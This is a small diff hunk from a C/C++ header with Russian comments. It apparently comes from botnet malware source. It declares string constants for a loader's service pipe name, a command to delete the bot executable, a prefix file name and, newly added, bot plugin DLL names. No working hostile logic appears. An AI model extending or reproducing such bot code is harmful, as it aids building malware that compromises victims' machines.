@@ -64,8 +64,11 @@ extern CSSTR EStrPipeLoader[]; // Имя служебного пайпа лоадера
 extern CSSTR EStrProcessCommandDeleteBot[];  // Команда на удаление exe бота
 
 
+// Имя фала префикса
+extern CSSTR EStrPrefixFileName[];
 
-extern CSSTR EStrPrefixFileName[]; // Имя файла хранения префикса
+// Имена плагина бота в виде длл
+extern CSSTR EStrBotPlug[];
 
 
 
